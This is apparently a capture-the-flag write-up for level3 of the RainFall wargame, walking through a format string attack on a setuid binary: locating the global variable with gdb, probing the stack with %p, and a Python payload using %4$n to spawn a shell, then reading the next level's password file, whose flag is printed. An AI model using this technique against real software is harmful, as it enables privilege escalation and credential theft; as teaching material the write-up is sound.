Level3 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
```

Level3 rights:
```Shell
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
```

When testing the binary, we notice that it waits for user input and prints it back to us.
Decompiling with Ghidra on https://dogbolt.org/ shows four things:
- `main()` calls a `v()` function
- `v()` uses a buffer of 520 bytes that is used with `fgets()`, preventing us from doing the usual
exploitation of `gets()`
- however, `printf()` is also called and takes as its sole argument the buffer itself, which is unsafe
- a condition checks if `m` (a global variable) equals `0x40` (64). If true, it opens a terminal for us!

The goal is to replace the content of `m` with 64.
To do so, we can exploit `printf()` with a technique called [Format String Attack](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/):

_"[...]For example, if we can make the format argument "%x.%x.%x.%x", printf will pop off four stack values and print them in hexadecimal, potentially leaking sensitive information.
printf can also index to an arbitrary "argument" with the following syntax: "%n$x" (where n is the decimal index of the argument you want)."_

First, we must find the address of `m`. Disassembling `v()` with gdb shows us an address stored in `EAX`, then compared with 64.
```Shell
(gdb) disas v
[...]
 0x080484da <+54>:    mov    0x804988c,%eax
 0x080484df <+59>:    cmp    $0x40,%eax
[...]
 ```
This is the address of `m` converted into little endian: `\x8c\x98\x04\x08`.

With a bit of research, we stumbled upon the `%n` specifier. `%n` calculates how many characters have been printed, then stores the result at a specified `int*`.
Example:
```C
int a = 0;
printf("ABC%n", &a);
printf("%d", a);
```
Output:
```Shell
ABC
3
```

We can abuse `%n` to make it store the value (64) at the location of our choice (address of `m`).
Using the buffer is the best option: since we cannot directly pass the address of `m` directly to `%n`, we can give `%n` an index at which it is stored.
This is how we can use multiple `%p` to print the values on the stack, thus finding at which index our buffer starts:
```Shell
level3@RainFall:~$ ./level3
AAAA %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141
```

Now we know that it starts at the 4th index. Instead of writing `AAAA` (aka `0x41414141`), we will write
the address of `m` here.
Our buffer will contain [the address of `m`][A * 60], which makes it a size of 64. Perfect for abusing `%n`!
It will calculate a size of 64, then fetch the 4th index to store the value.
So our payload will be:
```Shell
level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + "A" * 60 + "%4$n")' > /tmp/payload3
```

And the result is:
```Shell
level3@RainFall:~$ cat /tmp/payload3 - | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```